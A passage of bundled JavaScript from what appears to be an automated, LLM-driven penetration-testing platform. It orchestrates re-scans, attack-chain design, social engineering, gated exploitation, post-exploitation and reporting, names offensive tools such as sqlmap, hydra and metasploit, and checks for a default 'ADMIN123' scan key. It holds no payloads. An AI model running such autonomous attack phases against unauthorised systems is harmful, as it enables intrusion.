              ...(asset.toolResults || []).filter((tr) => tr.findingCount > 0 || tr.outputPreview).map((tr) => ({
                type: "tool_result",
                title: `[${tr.tool}] ${tr.findingCount} findings (exit ${tr.exitCode}, ${tr.phase})`,
                severity: tr.findingCount > 0 ? "info" : "low",
                target: asset.hostname,
                host: getEffectiveTarget(asset, "http"),
                details: tr.outputPreview ? tr.outputPreview.slice(0, 500) : `${tr.tool} ran with ${tr.findingCount} findings`,
                tool: tr.tool,
                phase: tr.phase
              }))
            ]);
            const cloudDetection = state.cloudDetection;
            if (cloudDetection?.findings) {
              for (const cf of cloudDetection.findings) {
                allFindingsForLLM.push({
                  type: "cloud_misconfiguration",
                  title: cf.title,
                  severity: cf.severity,
                  target: cf.asset,
                  host: cf.asset,
                  details: `${cf.provider} ${cf.service}: ${cf.title}`
                });
              }
            }
            const scope = {
              targets: state.assets.map((a) => getEffectiveTarget(a, "http")),
              engagementName: engagement?.name || `Engagement #${state.engagementId}`
            };
            const isFeedbackTrainingLab = state.trainingLabMode || ["brokencrystals", "broken-crystals", "dvwa", "juiceshop", "juice-shop", "bwapp", "altoro", "hackazon", "testphp", "webgoat", "mutillidae", "bodgeit", "gruyere"].some((lab) => state.assets.some((a) => a.hostname.toLowerCase().includes(lab)));
            const feedbackState = await runFeedbackLoop(allFindingsForLLM, scope, {
              maxIterations: isFeedbackTrainingLab ? 5 : 5,
              maxTotalScans: isFeedbackTrainingLab ? 20 : 12,
              maxScansPerIteration: isFeedbackTrainingLab ? 6 : 4,
              minIterations: isFeedbackTrainingLab ? 3 : 0,
              staleThreshold: isFeedbackTrainingLab ? 3 : 2,
              engagementId: state.engagementId,
              onProgress: (fbState) => {
                state.currentAction = `LLM feedback loop: iteration ${fbState.iteration + 1}, ${fbState.totalScansExecuted} scans executed`;
                broadcastOpsUpdate(state.engagementId, {
                  type: "action",
                  action: "llm_feedback_progress",
                  data: { iteration: fbState.iteration, scans: fbState.totalScansExecuted }
                });
              }
            });
            let newFindingsCount = 0;
            for (const h of feedbackState.history) {
              if (h.result.exitCode === 0 && h.result.stdout.length > 10) {
                const targetAsset = state.assets.find(
                  (a) => a.hostname === h.request.target || a.ip === h.request.target
                );
                if (targetAsset) {
                  const parsedFindings = parseToolOutput(h.request.tool, h.result.stdout, targetAsset);
                  for (const pf of parsedFindings) {
                    if (pushVulnDeduped(targetAsset, {
                      id: `rescan-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
                      severity: pf.severity,
                      title: pf.title,
                      cve: pf.cve,
                      description: pf.description,
                      corroborationTier: "confirmed",
                      evidenceDetail: `Confirmed by ${h.request.tool} re-scan`,
                      rawEvidence: pf.evidence ? JSON.stringify(pf.evidence).slice(0, 4e3) : void 0,
                      source: h.request.tool
                    })) {
                      state.stats.vulnsFound++;
                      newFindingsCount++;
                    }
                  }
                }
                addLog(state, {
                  phase: "vuln_detection",
                  type: "scan_result",
                  title: `\u{1F504} Re-scan: ${h.request.tool} \u2192 ${h.request.target}`,
                  detail: `Rationale: ${h.request.rationale}
Exit: ${h.result.exitCode} | Duration: ${Math.round(h.result.durationMs / 1e3)}s
Output preview: ${h.result.stdout.slice(0, 300)}`,
                  data: { request: h.request, exitCode: h.result.exitCode }
                });
              }
            }
            const summary = getFeedbackLoopSummary(feedbackState);
            addLog(state, {
              phase: "vuln_detection",
              type: "phase_complete",
              title: `\u2705 LLM Feedback Loop Complete \u2014 ${feedbackState.totalScansExecuted} re-scans, ${newFindingsCount} new findings`,
              detail: `Iterations: ${feedbackState.iteration + 1} | Satisfied: ${feedbackState.satisfied}
${feedbackState.finalAnalysis?.slice(0, 500) || ""}`,
              data: { feedbackState: { ...feedbackState, history: feedbackState.history.map((h) => ({ tool: h.request.tool, target: h.request.target, exitCode: h.result.exitCode })) } }
            });
            state.scanFeedbackLoop = feedbackState;
          } catch (feedbackErr) {
            console.error("[ScanFeedback] Feedback loop failed:", feedbackErr.message);
            addLog(state, {
              phase: "vuln_detection",
              type: "warning",
              title: "\u26A0\uFE0F LLM Feedback Loop Failed",
              detail: `Adaptive re-scanning could not complete: ${feedbackErr.message}. Proceeding with existing findings.`
            });
          }
        }
        if (state.stats.vulnsFound > 0) {
          try {
            state.currentAction = "Designing attack chains with LLM...";
            addLog(state, {
              phase: "vuln_detection",
              type: "info",
              title: "\u{1F9E0} Attack Chain Design",
              detail: "LLM is designing multi-stage attack chains from all vulnerability, cloud, and re-scan findings."
            });
            broadcastOpsUpdate(state.engagementId, { type: "action", action: "attack_chain_design" });
            const { generateEngagementAttackChains } = await import("./cloud-attack-chain-designer-5WVKOZR7.js");
            const attackChains = await generateEngagementAttackChains(
              state,
              engagement?.targetDescription || state.assets.map((a) => a.hostname).join(", ")
            );
            state.attackChains = attackChains;
            addLog(state, {
              phase: "vuln_detection",
              type: "phase_complete",
              title: `\u2705 Attack Chains Designed \u2014 ${attackChains.length} chains generated`,
              detail: attackChains.map(
                (c, i) => `Chain ${i + 1}: ${c.name} (risk: ${c.overallRisk}/10, feasibility: ${c.feasibility}/10, steps: ${c.totalSteps})`
              ).join("\n"),
              data: { chainCount: attackChains.length, chains: attackChains.map((c) => ({ name: c.name, risk: c.overallRisk, feasibility: c.feasibility, steps: c.totalSteps })) }
            });
          } catch (chainErr) {
            console.error("[AttackChainDesigner] Chain design failed:", chainErr.message);
            addLog(state, {
              phase: "vuln_detection",
              type: "warning",
              title: "\u26A0\uFE0F Attack Chain Design Failed",
              detail: `LLM attack chain generation could not complete: ${chainErr.message}. Proceeding to exploitation with raw findings.`
            });
          }
        }
        state.stats.vulnsFound = state.assets.reduce((sum, a) => sum + a.vulns.length, 0);
        state.stats.portsFound = state.assets.reduce((sum, a) => sum + a.ports.length, 0);
        const scanforgeResult = state._scanforgeResult;
        if (scanforgeResult && scanforgeResult.stats.findingsTotal > 0) {
          try {
            const legacyFindings = [];
            for (const asset of state.assets) {
              for (const v of asset.vulns) {
                if (!v.title.startsWith("[ScanForge]")) {
                  legacyFindings.push({
                    tool: v.title.includes("ZAP") || v.title.includes("zap") ? "zap" : "nuclei",
                    title: v.title,
                    target: asset.hostname,
                    severity: v.severity,
                    cve: v.cve
                  });
                }
              }
            }
            await runPostEngagementAnalysis(
              String(state.engagementId),
              scanforgeResult,
              legacyFindings,
              (entry) => addLog(state, { ...entry, phase: entry.phase || "vuln_detection", type: entry.type || "info" })
            );
          } catch (compErr) {
            console.warn("[ScanForge Comparison] Post-scan analysis failed:", compErr.message);
          }
        }
        try {
          const { promoteAllScannerExploits } = await import("./nuclei-exploit-promotion-R4O732EC.js");
          const promotionSummary = promoteAllScannerExploits(
            state.assets,
            state.stats,
            (entry) => addLog(state, entry)
          );
          if (promotionSummary.totalPromoted > 0) {
            const scannerBreakdown = Object.entries(promotionSummary.byScanner || {}).map(([k, v]) => `${k.toUpperCase()}: ${v}`).join(", ");
            addLog(state, {
              phase: "vuln_detection",
              type: "phase_complete",
              title: `\u26A1 Scanner Exploit Promotion: ${promotionSummary.totalPromoted} finding(s) promoted`,
              detail: `${promotionSummary.totalPromoted} scanner findings with demonstrated exploitation impact promoted to verified exploits.
By scanner: ${scannerBreakdown}
By category: ${Object.entries(promotionSummary.byCategory).map(([k, v]) => `${k}: ${v}`).join(", ")}
By confidence: ${Object.entries(promotionSummary.byConfidence).map(([k, v]) => `${k}: ${v}`).join(", ")}
Promoted: ${promotionSummary.promotedVulns.map((p) => `${p.vulnTitle.slice(0, 50)} [${p.scanner}/${p.category}]`).join("; ")}`,
              data: { scannerPromotion: promotionSummary }
            });
          } else {
            addLog(state, {
              phase: "vuln_detection",
              type: "info",
              title: "\u26A1 Scanner Exploit Promotion: No findings qualified",
              detail: "No Nuclei/ZAP/Burp findings met the promotion criteria for verified exploit status. All vulns will proceed to standard exploitation phase."
            });
          }
        } catch (promoErr) {
          console.error("[ScannerPromotion] Promotion logic failed:", promoErr.message);
          addLog(state, {
            phase: "vuln_detection",
            type: "warning",
            title: "\u26A0\uFE0F Scanner Exploit Promotion Failed",
            detail: `Promotion logic encountered an error: ${promoErr.message}. Proceeding without promotions.`
          });
        }
        {
          const { executeSocialEngineering } = await import("./engagement-phase-social-engineering-US2HJEX2.js");
          const socialEngResult = await executeSocialEngineering(
            state,
            engagement,
            {
              addLog: (entry) => addLog(state, entry),
              broadcastUpdate: (update) => broadcastOpsUpdate(state.engagementId, update)
            }
          );
          if (socialEngResult.phishingIntel) {
            state.phishingIntel = socialEngResult.phishingIntel;
          }
          if (socialEngResult.executed) {
            await phaseCheckpoint("social_engineering");
            if (!state.isRunning) return;
          }
        }
        const exploitGate = safetyEngine.canEnterPhase("exploitation");
        if (!exploitGate.allowed) {
          addLog(state, { phase: "exploitation", type: "warning", title: "\u{1F6E1}\uFE0F Safety: Exploitation Blocked", detail: `${exploitGate.reason}. Requires safety level '${exploitGate.requiredLevel}' or higher. ${state.stats.vulnsFound} vulns found but exploitation is not permitted at current safety level.` });
        } else if (state.stats.vulnsFound > 0) {
          try {
            await executeExploitation(state, engagement, operatorCtx);
          } catch (exploitErr) {
            if (exploitErr?.name === "AbortError" || exploitErr?.message?.includes("abort") || exploitErr?.message?.includes("Abort")) {
              addLog(state, { phase: "exploitation", type: "warning", title: "\u26A1 Exploitation Force-Aborted", detail: "Phase was force-aborted due to stall. Continuing to next phase with partial results." });
            } else {
              addLog(state, { phase: "exploitation", type: "error", title: "\u274C Exploitation Error", detail: `${exploitErr?.message || exploitErr}`.slice(0, 500) });
            }
          }
          await breathe();
          try {
            const { executeCustomerIntegrationsForStage } = await import("./pipeline-bridge-6FOLEX4B.js");
            const custExploitResults = await executeCustomerIntegrationsForStage({
              engagementId,
              targetDomain: state.assets[0]?.hostname || "",
              phase: "exploitation",
              targetIps: state.assets.flatMap((a) => a.ips || []),
              assets: state.assets.map((a) => ({ hostname: a.hostname, ip: a.ips?.[0], assetType: a.assetType }))
            });
            if (custExploitResults.length > 0) {
              const successCount = custExploitResults.filter((r) => r.status === "success").length;
              addLog(state, { phase: "exploitation", type: "info", title: "\u{1F50C} Customer Integrations (Exploit)", detail: `${successCount}/${custExploitResults.length} sources executed` });
            }
          } catch (e) {
            addLog(state, { phase: "exploitation", type: "warning", title: "Customer Integration Warning", detail: e.message });
          }
          await phaseCheckpoint("exploitation");
          if (!state.isRunning) return;
        } else {
          addLog(state, { phase: "exploitation", type: "info", title: "No Exploitable Vulns", detail: "No vulnerabilities found to exploit. Engagement complete." });
        }
        const postExploitGate = safetyEngine.canEnterPhase("post_exploit");
        if (!postExploitGate.allowed) {
          addLog(state, { phase: "post_exploit", type: "warning", title: "\u{1F6E1}\uFE0F Safety: Post-Exploit Blocked", detail: `${postExploitGate.reason}. Requires safety level '${postExploitGate.requiredLevel}' or higher.` });
        } else if (state.stats.exploitsSucceeded > 0) {
          await executePostExploit(state, engagement, operatorCtx);
          try {
            const { executeCustomerIntegrationsForStage } = await import("./pipeline-bridge-6FOLEX4B.js");
            const custPostResults = await executeCustomerIntegrationsForStage({
              engagementId,
              targetDomain: state.assets[0]?.hostname || "",
              phase: "post_exploit",
              targetIps: state.assets.flatMap((a) => a.ips || [])
            });
            if (custPostResults.length > 0) {
              const successCount = custPostResults.filter((r) => r.status === "success").length;
              addLog(state, { phase: "post_exploit", type: "info", title: "\u{1F50C} Customer Integrations (Post-Exploit)", detail: `${successCount}/${custPostResults.length} sources executed` });
            }
          } catch (e) {
            addLog(state, { phase: "post_exploit", type: "warning", title: "Customer Integration Warning", detail: e.message });
          }
          await phaseCheckpoint("post_exploit");
        }
      } else {
        addLog(state, { phase: "enumeration", type: "error", title: "\u26D4 Active Phases Blocked", detail: "RoE must be signed to proceed past recon. Please have the team lead sign the RoE." });
      }
      try {
        const { retryDeferredScans, getDeferredScans, clearDeferredScans } = await import("./job-queue-bridge-TUKZ3QDD.js");
        const deferred = getDeferredScans(engagementId);
        if (deferred.length > 0) {
          addLog(state, {
            phase: "post_exploit",
            type: "info",
            title: `\u{1F504} Deferred Scan Retry: ${deferred.length} failed scans`,
            detail: `Retrying scans that failed due to infrastructure issues: ${deferred.map((d) => d.config.tool).join(", ")}`
          });
          const retryResults = await retryDeferredScans(engagementId, {
            engagementAbortSignal: engagementAbortSig,
            maxRetries: 2
          });
          if (retryResults.length > 0) {
            addLog(state, {
              phase: "post_exploit",
              type: "info",
              title: `\u2705 Deferred Retry Success: ${retryResults.length}/${deferred.length} scans recovered`,
              detail: retryResults.map((r) => `${r.tool}: exit=${r.result.exitCode}, stdout=${r.result.stdout?.length || 0}b`).join("\n")
            });
            for (const { tool, result } of retryResults) {
              if (result.stdout && state.assets.length > 0) {
                const asset = state.assets[0];
                const findings = parseToolOutput(tool, result.stdout, asset);
                for (const f of findings) {
                  pushVulnDeduped(asset, {
                    id: genId(),
                    severity: f.severity,
                    title: f.title,
                    cve: f.cve,
                    description: f.description,
                    cvss: f.cvss,
                    cwe: f.cwe,
                    corroborationTier: "confirmed",
                    evidenceDetail: `Confirmed by ${tool} (deferred retry)`,
                    rawEvidence: f.evidence ? JSON.stringify(f.evidence).slice(0, 4e3) : void 0,
                    source: tool
                  });
                  state.stats.vulnsFound++;
                }
                asset.toolResults.push({
                  tool,
                  command: result.command || `${tool} (deferred)`,
                  exitCode: result.exitCode,
                  durationMs: result.durationMs || 0,
                  timedOut: result.timedOut || false,
                  findingCount: findings.length,
                  findings: findings.map((f) => ({ severity: f.severity, title: f.title })),
                  outputPreview: result.stdout.slice(0, 512),
                  executedAt: Date.now(),
                  phase: "deferred_retry"
                });
              }
            }
          } else {
            addLog(state, {
              phase: "post_exploit",
              type: "warning",
              title: `\u26A0\uFE0F Deferred Retry: 0/${deferred.length} scans recovered`,
              detail: `Infrastructure may still be unavailable. Failed tools: ${deferred.map((d) => d.config.tool).join(", ")}`
            });
          }
          clearDeferredScans(engagementId);
        }
      } catch (deferredErr) {
        console.error("[DeferredRetry] Failed:", deferredErr.message);
        addLog(state, { phase: "post_exploit", type: "error", title: "Deferred Scan Retry Failed", detail: deferredErr.message });
      }
      try {
        for (const asset of state.assets) {
          const tech = asset.passiveRecon?.technologies || [];
          if (tech.length > 0) owaspTracker.registerAssetTech(asset.hostname, tech);
          for (const tr of asset.toolResults) {
            owaspTracker.addToolRun({ tool: tr.tool, target: asset.hostname, command: tr.command, exitCode: tr.exitCode });
            for (const f of tr.findings) {
              owaspTracker.addFinding({ title: f.title, severity: f.severity, tool: tr.tool, target: asset.hostname });
            }
          }
          for (const v of asset.vulns) {
            owaspTracker.addFinding({ title: v.title, severity: v.severity, tool: "nuclei", target: asset.hostname });
          }
          for (const z of asset.zapFindings) {
            owaspTracker.addFinding({ title: z.alert, severity: z.risk, tool: "zap", target: asset.hostname });
          }
        }
        const owaspCoverage = owaspTracker.getEngagementCoverage(String(engagementId));
        addLog(state, {
          phase: "completed",
          type: "info",
          title: `\u{1F6E1}\uFE0F OWASP Top 10:2025 Coverage: ${owaspCoverage.overallScore}%`,
          detail: `${owaspCoverage.totalTested} tested, ${owaspCoverage.totalPartial} partial, ${owaspCoverage.totalGaps} gaps, ${owaspCoverage.criticalGaps.length} critical gaps`,
          data: { owaspCoverage }
        });
      } catch (e) {
        console.error("[OWASP Coverage] Failed to generate coverage:", e.message);
      }
      clearInterval(heartbeatInterval);
      clearInterval(periodicPersistInterval);
      const allToolResults = state.assets.flatMap((a) => a.toolResults || []);
      const totalToolRuns = allToolResults.length;
      const failedToolRuns = allToolResults.filter(
        (tr) => tr.exitCode !== 0 || tr.timedOut || tr.durationMs < 100
      ).length;
      const toolFailureRate = totalToolRuns > 0 ? failedToolRuns / totalToolRuns : 0;
      const isDegraded = totalToolRuns >= 3 && toolFailureRate > 0.5;
      const scanKeyIsPlaceholder = SCAN_API_KEY === "ADMIN123";
      const exploitBlockedByAuth = scanKeyIsPlaceholder && state.stats.exploitsAttempted > 0 && state.stats.exploitsSucceeded === 0;
      if (isDegraded) {
        state.phase = "degraded";
        addLog(state, {
          phase: "degraded",
          type: "error",
          title: "\u26A0\uFE0F ENGAGEMENT DEGRADED \u2014 Tool Failure Rate Exceeds 50%",
          detail: `${failedToolRuns}/${totalToolRuns} tool executions failed (${Math.round(toolFailureRate * 100)}%). Results are unreliable. Check scan server connectivity, tool installations, and resource limits. Report will include a DEGRADED banner.`,
          data: { toolFailureRate, failedToolRuns, totalToolRuns }
        });
      } else {
        state.phase = "completed";
      }
      if (exploitBlockedByAuth) {
        addLog(state, {
          phase: state.phase,
          type: "error",
          title: "\u{1F512} X-Scan-Key Still Using Default Placeholder (ADMIN123)",
          detail: `All ${state.stats.exploitsAttempted} exploit attempts likely blocked by scanner gateway authentication. The SCAN_API_KEY is still set to the default "ADMIN123" placeholder. Configure a real scan key in scan-service-url.ts or set SCAN_API_KEY env var.`,
          data: { scanKeyIsPlaceholder, exploitsAttempted: state.stats.exploitsAttempted, exploitsSucceeded: state.stats.exploitsSucceeded }
        });
      }
      state.progress = 100;
      state.isRunning = false;
      state.completedAt = Date.now();
      state.currentAction = void 0;
      state.stats.toolFailureRate = toolFailureRate;
      state.stats.totalToolRuns = totalToolRuns;
      state.stats.failedToolRuns = failedToolRuns;
      state.stats.isDegraded = isDegraded;
      state.stats.scanKeyIsPlaceholder = scanKeyIsPlaceholder;
      const ACTIVE_SCAN_SOURCES = ["nuclei", "zap", "sqlmap", "naabu", "masscan", "nerva", "hydra", "nikto", "xss-scanner", "metasploit", "httpx", "ffuf"];
      let totalVulns = 0;
      let verifiedVulns = 0;
      let unverifiedVulns = 0;
      for (const asset of state.assets) {
        for (const vuln of asset.vulns) {
          totalVulns++;
          const hasRawEvidence = !!(vuln.rawEvidence || vuln.evidence);
          const isConfirmed = vuln.corroborationTier === "confirmed" || vuln.corroborationTier === "corroborated";
          const isFromActiveScan = ACTIVE_SCAN_SOURCES.some((s) => (vuln.source || "").toLowerCase().includes(s) || (vuln.title || "").toLowerCase().includes(`[${s}]`));
          if (hasRawEvidence || isConfirmed || isFromActiveScan) {
            if (!vuln.corroborationTier) vuln.corroborationTier = "confirmed";
            verifiedVulns++;
          } else {
            vuln.corroborationTier = "unverified";
            unverifiedVulns++;
          }
        }
      }
      let verifiedExploits = 0;
      let unverifiedExploits = 0;
      for (const asset of state.assets) {
        for (const exploit of asset.exploitAttempts) {
          const hasExploitEvidence = !!(exploit.exploitOutput || exploit.httpEvidence || exploit.attackPayload);
          if (hasExploitEvidence) {
            verifiedExploits++;
          } else {
            unverifiedExploits++;
          }
        }
      }
      state.stats.vulnsFound = totalVulns;
      state.stats.portsFound = state.assets.reduce((sum, a) => sum + a.ports.length, 0);
      state.stats.verifiedVulns = verifiedVulns;
      state.stats.unverifiedVulns = unverifiedVulns;
      state.stats.verifiedExploits = verifiedExploits;
      state.stats.unverifiedExploits = unverifiedExploits;
      addLog(state, {
        phase: "completed",
        type: "phase_complete",
        title: "\u{1F3C1} Engagement Execution Complete",
        detail: `${state.stats.hostsScanned} hosts, ${verifiedVulns} verified vulns (${unverifiedVulns} unverified \u2014 excluded from risk), ${state.stats.exploitsSucceeded}/${state.stats.exploitsAttempted} exploits (${verifiedExploits} with evidence), ${state.stats.zapScansRun} ZAP scans`
      });
      try {
        const { selectFindingsForScreenshot, captureScreenshotBatch } = await import("./screenshot-capture-6YNH6OVJ.js");
        const allVulnsForScreenshot = state.assets.flatMap((a) => {
          const assetBaseUrl = (() => {
            const host = a.hostname || a.ip;
            if (!host) return void 0;
            const httpPort = a.ports?.find((p) => p.service === "http" || p.port === 80);
            const httpsPort = a.ports?.find((p) => p.service === "https" || p.service === "ssl/http" || p.port === 443);
            if (httpsPort) return `https://${host}${httpsPort.port !== 443 ? ":" + httpsPort.port : ""}`;
            if (httpPort) return `http://${host}${httpPort.port !== 80 ? ":" + httpPort.port : ""}`;
            if (a.type === "web_application" || a.type === "subdomain") return `https://${host}`;
            return void 0;
          })();
          const vulnEntries = (a.vulns || []).map((v) => ({
            id: v.id,
            title: v.title || v.name || "Unknown",
            severity: v.severity || "info",
            endpoint: v.endpoint || v.url || assetBaseUrl,
            url: v.endpoint || v.url || assetBaseUrl,
            source: v.source || v.tool,
            corroborationTier: v.corroborationTier
          }));
          const zapEntries = (a.zapFindings || []).map((z) => ({
            id: `zap-${z.alert}-${z.url}`,
            title: z.alert || "ZAP Finding",
            severity: z.risk || "medium",
            endpoint: z.url,
            url: z.url,
            source: "zap",
            corroborationTier: "confirmed"
          }));
          const seenUrls = new Set(vulnEntries.filter((v) => v.url).map((v) => `${v.title}|${v.url}`));
          const uniqueZapEntries = zapEntries.filter((z) => !seenUrls.has(`[ZAP] ${z.title}|${z.url}`));
          return [...vulnEntries, ...uniqueZapEntries];
        });
        const screenshotTargets = selectFindingsForScreenshot(allVulnsForScreenshot, 15);
        if (screenshotTargets.length > 0) {
          addLog(state, {
            phase: "completed",
            type: "info",
            title: `\u{1F4F8} Capturing ${screenshotTargets.length} evidence screenshots...`,
            detail: `Targeting ${screenshotTargets.filter((s) => s.severity === "critical" || s.severity === "high").length} critical/high findings`
          });
          broadcastOpsUpdate(state.engagementId, { type: "log_update" });
          const screenshotRequests = screenshotTargets.map((t) => ({
            url: t.url,
            engagementId,
            findingId: t.findingId,
            findingTitle: t.findingTitle,
            severity: t.severity
          }));
          const screenshotResults = await captureScreenshotBatch(screenshotRequests, {
            maxConcurrency: 3,
            onProgress: (done, total) => {
              state.currentAction = `Capturing screenshots: ${done}/${total}`;
            }
          });
          let successCount = 0;
          let failCount = 0;
          for (const [key, result] of screenshotResults) {
            if (result.success) {
              successCount++;
              for (const asset of state.assets) {
                const vuln = (asset.vulns || []).find(
                  (v) => v.id === key || v.title === key || v.name === key
                );
                if (vuln) {
                  vuln.screenshotPath = result.screenshotPath;
                  vuln.screenshotCapturedAt = result.capturedAt;
                  vuln.screenshotPageTitle = result.pageTitle;
                  break;
                }
              }
            } else {
              failCount++;
            }
          }
          addLog(state, {
            phase: "completed",
            type: successCount > 0 ? "info" : "warning",
            title: `\u{1F4F8} Screenshots: ${successCount} captured, ${failCount} failed`,
            detail: `Evidence screenshots attached to ${successCount} findings`
          });
        } else {
          addLog(state, {
            phase: "completed",
            type: "info",
            title: "\u{1F4F8} No web-accessible findings for screenshot capture",
            detail: "Screenshots require HTTP-accessible vulnerability endpoints"
          });
        }
      } catch (ssErr) {
        console.warn("[ScreenshotCapture] Failed:", ssErr.message);
        addLog(state, {
          phase: "completed",
          type: "warning",
          title: "\u26A0\uFE0F Screenshot capture failed",
          detail: ssErr.message
        });
      }
      try {
        const { generateAttackNarratives, generateExecutiveSummary } = await import("./attack-narrative-generator-PPAYHZSH.js");
        const narrativeInput = {
          engagementId: state.engagementId,
          engagementName: state.engagementName || `Engagement #${state.engagementId}`,
          targetProfile: state.targetProfiles ? {
            industry: void 0,
            waf: Object.values(state.targetProfiles)[0]?.waf?.vendor,
            cdn: Object.values(state.targetProfiles)[0]?.cdn?.provider,
            techStack: Object.values(state.targetProfiles)[0]?.fingerprint?.webServer ? [Object.values(state.targetProfiles)[0]?.fingerprint?.webServer] : []
          } : void 0,
          assets: state.assets.map((a) => ({
            hostname: a.hostname || a.ip,
            ip: a.ip,
            ports: a.ports,
            vulns: (a.vulns || []).map((v) => ({
              id: v.id,
              title: v.title || v.name,
              severity: v.severity,
              description: v.description,
              tool: v.tool || v.source,
              cve: v.cve,
              endpoint: v.endpoint || v.url,
              rawEvidence: v.rawEvidence || v.evidence,
              corroborationTier: v.corroborationTier,
              screenshotPath: v.screenshotPath
            })),
            exploitAttempts: a.exploitAttempts || [],
            toolResults: a.toolResults || []
          }))
        };
        addLog(state, {
          phase: "completed",
          type: "info",
          title: "\u{1F4DD} Generating attack narratives...",
          detail: "LLM analyzing findings to produce kill chain narratives"
        });
        broadcastOpsUpdate(state.engagementId, { type: "log_update" });
        const narratives = await generateAttackNarratives(narrativeInput);
        if (narratives.length > 0) {
          state.attackNarratives = narratives;
          const execSummary = await generateExecutiveSummary({
            ...narrativeInput,
            stats: {
              vulnsFound: state.stats.vulnsFound || 0,
              verifiedVulns,
              exploitsAttempted: state.stats.exploitsAttempted || 0,
              exploitsSucceeded: state.stats.exploitsSucceeded || 0,
              portsFound: state.stats.portsFound || 0
            },
            narratives
          });
          state.executiveSummary = execSummary;
          addLog(state, {
            phase: "completed",
            type: "info",
            title: `\u{1F4DD} Generated ${narratives.length} attack narratives`,
            detail: [
              `Critical/High: ${narratives.filter((n) => n.severity === "critical" || n.severity === "high").length}`,
              `Medium: ${narratives.filter((n) => n.severity === "medium").length}`,
              `MITRE techniques mapped: ${[...new Set(narratives.flatMap((n) => n.mitreTechniques))].length}`
            ].join(" | ")
          });
        } else {
          addLog(state, {
            phase: "completed",
            type: "info",
            title: "\u{1F4DD} No findings eligible for narrative generation",
            detail: "Attack narratives require confirmed findings with evidence"
          });
        }
      } catch (narrErr) {
        console.warn("[AttackNarrative] Generation failed:", narrErr.message);
        addLog(state, {
          phase: "completed",
          type: "warning",
          title: "\u26A0\uFE0F Attack narrative generation failed",
          detail: narrErr.message
        });
      }
      try {
        const flushResult = await flushChainToDb(String(state.engagementId));
        const anchor = createAnchor(String(state.engagementId));
        addLog(state, {
          phase: "completed",
          type: "evidence",
          title: `\u{1F510} Evidence Chain Sealed`,
          detail: [
            `Flushed ${flushResult.flushed} evidence envelopes to DB`,
            anchor ? `Merkle root: ${anchor.merkleRoot.slice(0, 16)}...` : "No anchor (empty chain)",
            anchor ? `Chain length: ${anchor.chainLength}` : "",
            flushResult.errors.length > 0 ? `Flush errors: ${flushResult.errors.length}` : ""
          ].filter(Boolean).join(" | "),
          data: {
            chainFlushed: flushResult.flushed,
            flushErrors: flushResult.errors,
            anchor: anchor ? {
              merkleRoot: anchor.merkleRoot,
              hmacSignature: anchor.hmacSignature,
              chainLength: anchor.chainLength,
              anchoredAt: anchor.anchoredAt
            } : null
          }
        });
      } catch (chainErr) {
        console.error("[EvidenceChain] Failed to flush/anchor:", chainErr.message);
      }
      try {
        const { runAccuracyComparison } = await import("./accuracy-feedback-loop-RLMP5WEP.js");
        const TRAINING_LAB_PATTERNS = [
          [/juice[-_]?shop/i, "juice-shop"],
          [/dvwa/i, "dvwa"],
          [/webgoat/i, "webgoat"],
          [/vampi/i, "vampi"],
          [/dvga/i, "dvga"],
          [/hackazon/i, "hackazon"],
          [/nodegoat/i, "nodegoat"],
          [/crapi/i, "crapi"],
          [/bwapp/i, "bwapp"],
          [/mutillidae/i, "mutillidae"],
          [/damn[-_]?vulnerable[-_]?web/i, "dvwa"],
          [/bodgeit/i, "bodgeit"],
          [/railsgoat/i, "railsgoat"],
          [/gruyere/i, "gruyere"],
          [/altoro[-_]?mutual/i, "altoro-mutual"],
          [/tiredful[-_]?api/i, "tiredful-api"],
          [/vulnerable[-_]?graphql/i, "dvga"],
          [/damn[-_]?vulnerable[-_]?graphql/i, "dvga"],
          [/owasp[-_]?benchmark/i, "owasp-benchmark"],
          [/security[-_]?shepherd/i, "security-shepherd"],
          [/wavsep/i, "wavsep"],
          [/vulnhub/i, "vulnhub"],
          [/metasploitable/i, "metasploitable"],
          [/hackthebox/i, "hackthebox"],
          [/pentesterlab/i, "pentesterlab"],
          [/overthewire/i, "overthewire"],
          [/picoctf/i, "picoctf"]
        ];
        const allHosts = state.assets.map((a) => a.hostname || "").join(" ");
        const targetName = state.targetName || "";
        const searchStr = `${allHosts} ${targetName}`.toLowerCase();
        let targetPreset = null;
        for (const [pattern, preset] of TRAINING_LAB_PATTERNS) {
          if (pattern.test(searchStr)) {
            targetPreset = preset;
            break;
          }
        }
        if (!targetPreset && state.metadata?.trainingLabPreset) {
          targetPreset = state.metadata.trainingLabPreset;
        }
        if (targetPreset) {
          addLog(state, {
            phase: "completed",
            type: "info",
            title: "\u{1F4CA} Accuracy Feedback Loop",
            detail: `Auto-comparing ${state.stats.vulnsFound} findings against ground truth for ${targetPreset}...`
          });
          broadcastOpsUpdate(state.engagementId, { type: "log_update" });
          const rawFindings = state.assets.flatMap((a) => [
            ...a.vulns.map((v) => ({
              name: v.title,
              severity: v.severity,
              cwe: v.cwe || void 0,
              owasp: v.owasp || void 0,
              endpoint: v.endpoint || void 0
            })),
            ...a.zapFindings.map((z) => ({
              name: z.alert,
              severity: z.risk,
              cwe: z.cweid ? `CWE-${z.cweid}` : void 0
            })),
            ...(a.nucleiFindings || []).map((n) => ({
              name: n.templateId || n.name || n.info?.name || "nuclei-finding",
              severity: n.info?.severity || n.severity || "info",
              cwe: n.classification?.cweId?.[0] ? `CWE-${n.classification.cweId[0]}` : void 0
            }))
          ]);
          const normalizeForScoring = (name) => (name || "").replace(/^\[\w+(?:\s*\w+)*\]\s*/i, "").replace(/^\(\w+\)\s*/i, "").replace(/\s+/g, " ").trim();
          const severityRank = { critical: 4, high: 3, medium: 2, low: 1, info: 0 };
          const deduped = /* @__PURE__ */ new Map();
          for (const f of rawFindings) {
            const key = normalizeForScoring(f.name).toLowerCase();
            const existing = deduped.get(key);
            if (!existing || (severityRank[f.severity?.toLowerCase() || "info"] || 0) > (severityRank[existing.severity?.toLowerCase() || "info"] || 0)) {
              deduped.set(key, { ...f, name: normalizeForScoring(f.name) });
            }
          }
          const allFindings = [...deduped.values()];
          if (rawFindings.length !== allFindings.length) {
            addLog(state, {
              phase: "completed",
              type: "info",
              title: `\u{1F504} Finding Normalization: ${rawFindings.length} \u2192 ${allFindings.length} (${rawFindings.length - allFindings.length} duplicates removed)`,
              detail: `Stripped tool prefixes and deduplicated findings before accuracy scoring.`
            });
            broadcastOpsUpdate(state.engagementId, { type: "log_update" });
          }
          const modulesUsed = [
            "nuclei",
            "zap",
            "scanforge-discovery",
            ...state.knowledgeModulesUsed || [],
            ...state.metadata?.knowledgeModules || []
          ];
